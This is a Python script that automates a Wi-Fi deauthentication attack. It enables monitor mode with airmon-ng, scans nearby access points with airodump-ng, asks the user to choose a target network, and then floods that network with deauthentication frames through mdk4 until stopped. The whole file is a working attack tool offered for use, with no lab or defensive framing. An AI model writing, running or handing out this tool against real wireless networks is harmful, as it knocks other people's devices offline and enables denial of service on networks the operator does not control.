#!/usr/bin/env python3
import os
import csv
import time
from subprocess import Popen

# Terminal colors
RED = '\033[31m'
GREEN = '\033[32m'
CYAN = '\033[36m'
ORANGE = '\033[93m'
LIGHTGRAY = '\033[37m'
RESET = '\033[39m'
YELLOW = '\033[33m'

home = os.path.expanduser('~')
scanned_path = os.path.join(home, 'wifi-scan')
DN = open(os.devnull, 'w')

if not os.path.exists(scanned_path):
    os.makedirs(scanned_path)

os.chdir(scanned_path)
os.system('clear')


def is_root():
    return os.geteuid() == 0


def quitGracefully(clear=True, monitor_interface=None):
    print(f"\n{LIGHTGRAY}Exiting...{RESET}")
    try:
        if clear:
            os.system('clear')
        os.system('stty sane')  # unfreeze terminal
        if monitor_interface:
            print(f"{ORANGE}* {LIGHTGRAY}Stopping monitoring interface {monitor_interface}{RESET}")
            cmd = ['sudo', 'airmon-ng', 'stop', monitor_interface]
            proc_restore = Popen(cmd, stdout=DN, stderr=DN)
            proc_restore.communicate()
            proc_restore.kill()

        cmd = ['sudo', 'service', 'NetworkManager', 'restart']
        Popen(cmd, stdout=DN, stderr=DN).communicate()
    except:
        pass
    exit(0)


def selectInterface():
    os.system('sudo airmon-ng check kill')
    while True:
        try:
            os.system('clear')
            print(f"{CYAN}Available Wi-Fi Interfaces:{RESET}\n")

            interface_list = []
            for i in os.listdir("/sys/class/net/"):
                if not i.startswith(('eth', 'lo')):
                    interface_list.append(i)

            for idx, iface in enumerate(interface_list):
                print(f" {LIGHTGRAY}[{ORANGE}{idx}{LIGHTGRAY}] {iface}{RESET}")

            choice = int(input(f"\nSelect interface > {ORANGE}"))
            interface = interface_list[choice]

            monitor_interface = None
            for i in os.listdir("/sys/class/net/"):
                if 'mon' in i and interface in i:
                    monitor_interface = i
                    print(f"{GREEN}Monitor interface already enabled: {monitor_interface}{RESET}")
                    return monitor_interface

            cmd = ['sudo', 'airmon-ng', 'start', interface]
            proc = Popen(cmd, stdout=DN, stderr=DN)
            proc.communicate()
            proc.kill()

            for i in os.listdir("/sys/class/net/"):
                if 'mon' in i and interface in i:
                    monitor_interface = i
                    print(f"{GREEN}Monitoring enabled on {monitor_interface}{RESET}")
                    return monitor_interface

            print(f"{RED}Error enabling monitor mode. Check your Wi-Fi card.{RESET}")
            quitGracefully(clear=False)
        except (ValueError, IndexError):
            continue
        except KeyboardInterrupt:
            quitGracefully()
            break


def scanAP(monitor_interface):
    cmd = ['sudo', 'airodump-ng', monitor_interface, '-w', 'scanned', '--output-format', 'csv']
    for f in os.listdir(scanned_path):
        if 'scanned' in f:
            os.remove(f)

    proc_read = Popen(cmd, stdout=DN, stderr=DN)

    while not os.path.exists(scanned_path + "/scanned-01.csv"):
        continue

    ssid_map = {}

    try:
        while True:
            os.system('clear')
            with open(scanned_path + '/scanned-01.csv') as csv_file:
                csv_reader = csv.reader(csv_file, delimiter=',')
                ssid_dict = {}   # {SSID: (BSSID, channel)}
                hit_clients = False

                for row in csv_reader:
                    if len(row) < 2:
                        continue
                    if not hit_clients:
                        if row[0].strip() == 'Station MAC':
                            hit_clients = True
                            continue
                        if len(row) < 14 or row[0].strip() == 'BSSID':
                            continue

                        ssid = row[13].strip()
                        bssid = row[0].strip()
                        channel = row[3].strip()

                        if ssid:  # skip hidden networks only
                            ssid_dict[ssid] = (bssid, channel)


                ssid_map = {i: (ssid, bssid, channel) 
                            for i, (ssid, (bssid, channel)) in enumerate(sorted(ssid_dict.items()))}

                print(f"{CYAN}Press CTRL+C when target name appears{RESET}\n")
                for i, (ssid, _, _) in ssid_map.items():
                    print(f"[{i}] {ssid}")

            time.sleep(1)

    except KeyboardInterrupt:
        proc_read.kill()
        os.system('clear')
        print(f"{GREEN}Scan stopped. Select your target:{RESET}\n")
        for i, (ssid, _, _) in ssid_map.items():
            print(f"[{i}] {ssid}")

        choice = int(input("\nEnter target number: "))
        target_ssid, target_bssid, target_channel = ssid_map[choice]
        print(f"\n{YELLOW}You selected:{RESET} {target_ssid} ({target_bssid}) on channel {target_channel}\n")
        
        return target_ssid, target_bssid, target_channel


def deauthAP(bssid, ssid, channel, monitor_interface):
    os.system('clear')
    print(f"{CYAN}Starting deauth attack on {ssid} ({bssid}) CH {channel}{RESET}")
    print(f"Press CTRL+C to stop.\n")

    try:
        cmd = f"sudo mdk4 {monitor_interface} d -c {channel} -B {bssid}"
        os.popen(cmd).read()
    except KeyboardInterrupt:
        quitGracefully(monitor_interface=monitor_interface)


try:
    if not is_root():
        print(f"{RED}Run this script as root (sudo).{RESET}")
        quitGracefully(clear=False)
    monitor_interface = selectInterface()
    if monitor_interface:
        ssid, bssid, channel = scanAP(monitor_interface)
        deauthAP(bssid, ssid, channel, monitor_interface)
except Exception as e:
    print(f"{RED}Error: {e}{RESET}")
    quitGracefully(clear=False)
